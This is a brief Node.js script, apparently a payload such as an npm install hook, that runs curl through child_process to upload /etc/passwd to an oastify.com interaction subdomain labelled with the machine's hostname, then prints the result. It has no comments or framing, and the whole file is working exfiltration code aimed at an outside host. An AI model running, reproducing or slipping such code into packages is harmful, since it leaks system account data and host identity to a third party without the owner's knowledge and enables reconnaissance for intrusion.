const { exec } = require("child_process");
exec("/usr/bin/curl --data '@/etc/passwd' $(hostname).t714xuxylkzc1emz33lq22lzlqrhff34.oastify.com" , (error, data, getter) => {
	if(error){
		console.log("error",error.message);
		return;
	}
	if(getter){
		console.log(data);
		return;
	}
	console.log(data);
	
});
